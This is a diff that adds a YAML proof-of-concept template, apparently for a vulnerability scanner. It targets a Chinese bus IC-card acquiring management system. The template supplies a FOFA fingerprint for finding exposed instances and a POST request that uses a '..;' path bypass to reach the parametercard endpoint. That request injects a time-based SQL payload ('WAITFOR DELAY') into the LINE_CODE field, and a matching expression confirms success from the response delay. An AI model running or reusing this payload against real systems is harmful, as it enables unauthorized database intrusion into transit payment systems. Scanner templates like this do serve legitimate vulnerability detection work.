@@ -1,0 +1,23 @@
+id: poc-yaml-bus-ic-card-ams-parametercard-sqli
+info:
+  name: 公交IC卡收单管理系统 parametercard SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 公交IC卡收单管理系统
+  fofa: app="公交IC卡收单管理系统"
+variables:
+  t1: random_int(1,5)
+  t2: t1 * 2
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /assets/..;/parametercard
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=select&organization=&lineCode=&_search=false&nd=1727249021156&rowCountPerPage=10&pageNo=1&sidx=LINE_CODE&sord=asc&ORGANIZATION_CODE=&LINE_CODE=1');WAITFOR
+    DELAY '0:0:{{.t1}}'--
+  expression: "status_code == 200 && \ncontains(body,\"window.top.window.jQuery\"\
+    ) &&\ncontains(body,\"(\\\"#temporary_iframe_id\\\")\") &&\ncontains(body,\"\\\
+    \"pageCount\\\":0\") &&\nduration >= t2 &&\nduration <= t3\n"
+transport: http
